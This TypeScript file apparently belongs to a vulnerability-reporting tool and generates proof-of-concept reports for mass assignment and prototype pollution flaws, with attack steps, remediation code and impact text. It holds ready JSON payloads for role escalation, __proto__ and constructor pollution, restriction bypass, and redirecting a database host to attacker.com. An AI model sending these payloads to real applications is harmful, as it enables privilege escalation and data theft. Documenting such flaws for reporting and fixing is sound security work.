import { ProofOfConcept, ExploitationStep, Payload } from '../types';
import { PocGenerator } from '../PocGenerator';
import { CodeFlowVisualizer } from '../CodeFlowVisualizer';
import { PocGenerationRequest, PocGenerationResult } from '../types';

/**
 * Mass Assignment / Object Pollution POC Generator
 *
 * Generates detailed Proof-of-Concept for mass assignment vulnerabilities,
 * including role escalation, permission bypass, and prototype pollution attacks.
 */
export class MassAssignmentPocGenerator extends PocGenerator {
  /**
   * Generate POC for mass assignment vulnerability
   */
  generate(request: PocGenerationRequest): PocGenerationResult {
    const startTime = Date.now();

    try {
      const assignmentType = this.identifyAssignmentType(request.vulnerableCode);
      const poc = this.createBasePoc(
        `mass-assignment-${request.location.line}`,
        `Mass Assignment Vulnerability in ${request.location.file}`,
        'Mass Assignment / Object Pollution',
        'CRITICAL',
        request
      );

      // Build exploitation steps
      poc.steps = this.buildExploitationSteps(request, assignmentType);

      // Build code flow
      poc.codeFlow = this.buildCodeFlow(request, assignmentType);

      // Description
      poc.description = this.buildDescription(assignmentType);

      // Root cause
      poc.rootCause = `User-supplied input is directly assigned to object properties without validation or whitelisting.
This allows attackers to modify sensitive fields such as roles, permissions, or admin status that should be protected.`;

      // Impacts
      poc.businessImpact = this.getBusinessImpact(assignmentType);
      poc.technicalImpact = this.getTechnicalImpact(assignmentType);

      // Payloads
      poc.payloads = this.buildPayloads(assignmentType);

      // Remediation
      poc.remediationDescription = `Implement field whitelisting to explicitly define which properties can be assigned from user input.
Never use Object.assign() or spread operators directly on user input. Validate and sanitize all incoming data.`;
      poc.remediationCode = this.getRemediationCode(assignmentType);

      // Preconditions
      poc.preconditions = [
        'Attacker can submit data to an endpoint that creates or updates objects',
        'Application uses Object.assign(), spread operator, or direct property assignment with user input',
        'No field whitelisting is implemented',
        'Sensitive fields (role, admin, permissions) are not protected from user input',
      ];

      poc.owaspCategory = 'A01:2021 – Broken Access Control';
      poc.cvssScore = 9.1;

      return {
        success: true,
        poc,
        duration: Date.now() - startTime,
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      return {
        success: false,
        error: `Failed to generate mass assignment POC: ${errorMessage}`,
        duration: Date.now() - startTime,
      };
    }
  }

  /**
   * Identify type of mass assignment vulnerability
   */
  private identifyAssignmentType(code: string): string {
    if (/prototype|__proto__|constructor/.test(code)) {
      return 'Prototype Pollution';
    } else if (/Object\.assign|\.\.\.req\.|spread/.test(code)) {
      return 'Direct Object Assignment';
    } else if (/Object\.entries|Object\.keys/.test(code)) {
      return 'Property Enumeration Assignment';
    } else if (/Object\.defineProperty/.test(code)) {
      return 'Property Injection';
    }
    return 'Mass Assignment';
  }

  /**
   * Build exploitation steps for mass assignment attack
   */
  private buildExploitationSteps(request: PocGenerationRequest, assignmentType: string): ExploitationStep[] {
    const steps: ExploitationStep[] = [];

    // Step 1: Discover object.assign or property assignment
    steps.push(
      this.createStep(1, 'Discover Vulnerable Object Assignment Pattern', 'attacker', {
        actionType: 'reconnaissance',
        notes: 'Identify endpoints that accept user input and assign to objects without whitelisting',
        expectedResult: 'Found endpoint that accepts POST/PUT with JSON payload',
      })
    );

    // Step 2: Identify assignable properties
    steps.push(
      this.createStep(2, 'Identify Unprotected Object Properties', 'attacker', {
        actionType: 'reconnaissance',
        notes: 'Determine which object properties are accessible and unprotected',
        payload: '{"username":"user","role":"user","isAdmin":false}',
        expectedResult: 'Know which sensitive properties can be modified (role, admin, permissions, etc)',
      })
    );

    // Step 3: Craft malicious payload
    if (assignmentType === 'Prototype Pollution') {
      steps.push(
        this.createStep(3, 'Craft Prototype Pollution Payload', 'attacker', {
          actionType: 'payload-creation',
          payload: this.getPrototypePollutionPayload(),
          notes: 'Design payload targeting __proto__ or constructor.prototype to affect all objects',
          expectedResult: 'Payload prepared to pollute prototype chain',
        })
      );
    } else {
      steps.push(
        this.createStep(3, 'Craft Role Escalation Payload', 'attacker', {
          actionType: 'payload-creation',
          payload: this.getRoleEscalationPayload(),
          notes: 'Create payload with elevated role/permission properties',
          expectedResult: 'Malicious payload prepared with admin privileges',
        })
      );
    }

    // Step 4: Send payload to vulnerable endpoint
    steps.push(
      this.createStep(4, 'Send Malicious Payload to Vulnerable Endpoint', 'attacker', {
        actionType: 'exploitation',
        codeSnippet: request.vulnerableCode,
        filePath: request.location.file,
        lineNumber: request.location.line,
        notes: 'Application directly assigns all user-supplied properties to object without filtering',
        expectedResult: 'Server accepts request, assigns malicious properties',
      })
    );

    // Step 5: Gain elevated privileges or bypass permissions
    steps.push(
      this.createStep(5, 'Gain Unauthorized Access or Escalated Privileges', 'attacker', {
        actionType: 'privilege-escalation',
        notes: assignmentType === 'Prototype Pollution'
          ? 'Polluted prototype affects all subsequent object operations'
          : 'User object now contains elevated role/admin status',
        expectedResult: assignmentType === 'Prototype Pollution'
          ? 'All application objects affected, complete system compromise possible'
          : 'Attacker has admin access, can perform privileged operations',
      })
    );

    return steps;
  }

  /**
   * Build code flow for mass assignment attack
   */
  private buildCodeFlow(request: PocGenerationRequest, assignmentType: string) {
    return CodeFlowVisualizer.generateFlowWithVariableTracking(
      request.vulnerableCode,
      request.location.file,
      request.location.line,
      'userInput',
      'Mass Assignment'
    );
  }

  /**
   * Get role escalation payload
   */
  private getRoleEscalationPayload(): string {
    return `{
  "username": "attacker",
  "email": "attacker@example.com",
  "password": "password123",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete", "manage_users"],
  "groupId": "admin-group"
}`;
  }

  /**
   * Get prototype pollution payload
   */
  private getPrototypePollutionPayload(): string {
    return `{
  "username": "attacker",
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "bypassed": true
  }
}`;
  }

  /**
   * Build attack payloads
   */
  private buildPayloads(assignmentType: string): Payload[] {
    const payloads: Payload[] = [];

    if (assignmentType === 'Prototype Pollution') {
      payloads.push(
        this.createPayload(
          'Basic Prototype Pollution',
          `{"__proto__": {"isAdmin": true, "role": "admin"}}`,
          'json',
          'Pollute prototype chain to grant admin privileges to all objects',
          {
            difficulty: 'medium',
            successRate: 95,
            expectedOutput: 'All subsequently created objects inherit admin properties',
          }
        ) as Payload,

        this.createPayload(
          'Constructor Property Injection',
          `{"constructor": {"prototype": {"isAdmin": true, "permission": "*"}}}`,
          'json',
          'Use constructor property to modify prototype chain',
          {
            difficulty: 'medium',
            successRate: 85,
            expectedOutput: 'Constructor modifications affect all object instances',
          }
        ) as Payload,

        this.createPayload(
          'Deep Property Pollution',
          `{"__proto__": {"db": {"host": "attacker.com", "user": "admin"}}}`,
          'json',
          'Inject malicious configuration through prototype pollution',
          {
            difficulty: 'hard',
            successRate: 70,
            expectedOutput: 'Application uses polluted configuration for database connections',
          }
        ) as Payload
      );
    } else {
      payloads.push(
        this.createPayload(
          'Role Escalation to Admin',
          `{"role": "admin", "isAdmin": true, "permissions": ["*"]}`,
          'json',
          'Escalate user role to administrator with full permissions',
          {
            difficulty: 'easy',
            successRate: 100,
            expectedOutput: 'User object updated with admin role and all permissions',
          }
        ) as Payload,

        this.createPayload(
          'Permission Override',
          `{"permissions": ["read", "write", "delete"], "billing_access": true}`,
          'json',
          'Override user permissions to grant unauthorized access',
          {
            difficulty: 'easy',
            successRate: 100,
            expectedOutput: 'User gains access to protected resources and billing data',
          }
        ) as Payload,

        this.createPayload(
          'Bypass Account Restrictions',
          `{"suspended": false, "verified": true, "trial_mode": false}`,
          'json',
          'Modify account status and restriction flags',
          {
            difficulty: 'easy',
            successRate: 100,
            expectedOutput: 'Account status modified, restrictions bypassed',
          }
        ) as Payload,

        this.createPayload(
          'Privilege Escalation via Hidden Fields',
          `{"subscription_level": "enterprise", "credit_limit": 1000000, "api_quota": "unlimited"}`,
          'json',
          'Modify hidden/internal fields to unlock premium features',
          {
            difficulty: 'medium',
            successRate: 90,
            expectedOutput: 'Hidden fields modified granting premium access',
          }
        ) as Payload
      );
    }

    return payloads;
  }

  /**
   * Build description
   */
  private buildDescription(assignmentType: string): string {
    if (assignmentType === 'Prototype Pollution') {
      return `A Prototype Pollution vulnerability has been identified in the application.
User-supplied input is directly assigned to object prototypes (__proto__ or constructor.prototype) without validation.

This vulnerability occurs when:
- User input is directly assigned to object properties
- The __proto__ or constructor properties are not explicitly blocked
- Object.assign() or spread operators are used with untrusted data
- No input validation or property whitelisting is performed
- Framework protections against prototype pollution are disabled`;
    }

    return `A Mass Assignment vulnerability has been identified in the application.
User-supplied input is directly assigned to sensitive object properties without validation or whitelisting.

This vulnerability occurs when:
- All properties from user input are blindly assigned to objects
- Sensitive properties (role, admin, permissions) lack protection
- Object.assign(), spread operators, or direct property assignment is used with untrusted data
- No field whitelisting mechanism is implemented
- Input validation does not check property names`;
  }

  /**
   * Get business impact
   */
  private getBusinessImpact(assignmentType: string): string {
    return `${assignmentType} can result in:

**Immediate Threats:**
- User privilege escalation to administrator level
- Unauthorized access to protected resources and data
- Modification of payment and billing information
- Bypass of subscription and trial restrictions
- Account status manipulation

**Business Impact:**
- Complete unauthorized access to sensitive features
- Data breach exposing customer information
- Revenue loss through subscription bypass
- Loss of customer trust and reputation damage
- Regulatory compliance violations (GDPR, HIPAA, PCI-DSS)
- Legal liability and mandatory breach notifications
- Business disruption from unauthorized modifications`;
  }

  /**
   * Get technical impact
   */
  private getTechnicalImpact(assignmentType: string): string {
    return `Technical consequences of ${assignmentType}:

**System Compromise:**
- Complete privilege escalation to administrative functions
- Unauthorized modification of user accounts and data
- Access to protected APIs and backend functionality
- Potential lateral movement to other services
${
  assignmentType === 'Prototype Pollution'
    ? `- Corruption of prototype chain affecting all application objects
- Injection of malicious code or configuration through polluted prototypes
- Possible remote code execution through property pollution`
    : `- Modification of sensitive fields like role, admin status, permissions
- Bypass of role-based access control (RBAC)
- Modification of account status and restrictions`
}

**Data Exposure:**
- Unauthorized access to user data and PII
- Financial data and payment information access
- Administrative logs and sensitive configuration exposure
- Ability to modify audit logs and forensic evidence`;
  }

  /**
   * Get remediation code
   */
  private getRemediationCode(assignmentType: string): string {
    if (assignmentType === 'Prototype Pollution') {
      return `// ❌ VULNERABLE: Direct assignment allows prototype pollution
app.post('/api/user', (req, res) => {
  const user = {};
  Object.assign(user, req.body);
  res.json(user);
});

// ✅ FIXED: Whitelist allowed properties
app.post('/api/user', (req, res) => {
  const ALLOWED_PROPS = ['username', 'email', 'password'];
  const user = {};
  ALLOWED_PROPS.forEach(prop => {
    if (req.body[prop]) user[prop] = req.body[prop];
  });
  res.json(user);
});

// ✅ FIXED: Use Object.create(null) to prevent prototype pollution
app.post('/api/user', (req, res) => {
  const ALLOWED_PROPS = ['username', 'email', 'password'];
  const user = Object.create(null);
  ALLOWED_PROPS.forEach(prop => {
    if (req.body[prop]) user[prop] = req.body[prop];
  });
  res.json(user);
});

// ✅ FIXED: Validate and block dangerous properties
function isSafeProperty(key) {
  return !['__proto__', 'constructor', 'prototype'].includes(key);
}

app.post('/api/user', (req, res) => {
  const user = {};
  Object.keys(req.body).forEach(key => {
    if (isSafeProperty(key)) {
      user[key] = req.body[key];
    }
  });
  res.json(user);
});`;
    }

    return `// ❌ VULNERABLE: Direct assignment without whitelisting
app.post('/api/user/:id', (req, res) => {
  const user = await User.findById(req.params.id);
  Object.assign(user, req.body);
  await user.save();
});

// ✅ FIXED: Use explicit field assignment with whitelist
app.post('/api/user/:id', (req, res) => {
  const ALLOWED_FIELDS = ['username', 'email', 'phone'];
  const user = await User.findById(req.params.id);
  
  ALLOWED_FIELDS.forEach(field => {
    if (req.body[field]) {
      user[field] = req.body[field];
    }
  });
  
  await user.save();
});

// ✅ FIXED: Use dedicated update method with validation
app.post('/api/user/:id', (req, res) => {
  const schema = Joi.object({
    username: Joi.string().alphanum().max(30),
    email: Joi.string().email(),
    phone: Joi.string().pattern(/^[0-9-]+$/),
  });
  
  const { error, value } = schema.validate(req.body);
  if (error) throw new Error(error.details[0].message);
  
  const user = await User.findByIdAndUpdate(req.params.id, value, { runValidators: true });
  res.json(user);
});

// ✅ FIXED: Use DTO (Data Transfer Object) pattern
class UpdateUserDTO {
  username?: string;
  email?: string;
  phone?: string;
}

app.post('/api/user/:id', (req, res) => {
  const updateData = new UpdateUserDTO();
  if (req.body.username) updateData.username = req.body.username;
  if (req.body.email) updateData.email = req.body.email;
  if (req.body.phone) updateData.phone = req.body.phone;
  
  const user = await User.findByIdAndUpdate(req.params.id, updateData);
  res.json(user);
});`;
  }
}
